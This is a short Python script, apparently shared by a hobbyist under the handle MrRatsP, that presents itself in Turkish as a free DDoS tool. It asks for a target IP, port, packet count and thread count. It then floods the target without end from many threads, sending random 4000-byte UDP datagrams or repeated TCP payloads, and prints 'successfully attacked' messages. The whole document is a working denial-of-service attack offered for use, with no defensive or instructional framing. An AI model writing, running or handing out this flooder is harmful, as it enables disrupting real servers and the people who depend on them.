import random
import socket
import threading


print("         ___  ,--.--------.   _,.---._       _,.---._                   ,-.-. ,-----.--.  ")
print("  .-._ .'=.'\/==/,  -   , -\,-.' , -  `.   ,-.' , -  `.    _.-.  ,--.-./=/ ,//` ` - /==/  ")
print(" /==/ \|==|  \==\.-.  - ,-./==/_,  ,  - \ /==/_,  ,  - \ .-,.'| /==/, ||=| -|`-'-. -|==|  ")
print(" |==|,|  / - |`--`\==\- \ |==|   .=.     |==|   .=.     |==|, | \==\,  \ / ,|    | `|==|  ")
print(" |==|  \/  , |     \==\_ \|==|_ : ;=:  - |==|_ : ;=:  - |==|- |  \==\ - ' - /    | -|==|  ")
print(" |==|- ,   _ |     |==|- ||==| , '='     |==| , '='     |==|, |   \==\ ,   |     | `|==|  ")
print(" |==| _ /\   |     |==|, | \==\ -    ,_ / \==\ -    ,_ /|==|- `-._|==| -  ,/   .-','|==|  ")
print(" /==/  / / , /     /==/ -/  '.='. -   .'   '.='. -   .' /==/ - , ,|==\  _ /   /     \==\  ")
print(" `--`./  `--`      `--`--`    `--`--''       `--`--''   `--`-----' `--`--'    `-----`---` ")
print("")
print("    Araç MrRatsP#0045 Tarafından yapılmıştır      ")
print("")
print("    Ücretsiz DD* aracıdır ve çok fazla OP değildir.")
print("")
print("    Youtube'da MrRatsP'ye abone olun")
print("")
ip = str(input("Lütfen IP'yi girin: "))
print("")
port = int(input("Lütfen Limanı Girin (17091/80): "))
print("")
choice = str(input("UDP(Y/N): "))
print("")
times = int(input("Paketler: "))
print("")
threads = int(input("İş Parçacığı: "))
print("")

def run():
	data = random._urandom(4000)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"[+] Başarıyla Saldırıya Uğradı")
		except:
			print("[-] Hata Oluşturuldu!")




def run2():
	data = random._urandom(30)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"[+] Başarıyla Saldırıya Uğradı")
		except:
			s.close()
			print("[-] Hata Oluşturuldu!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

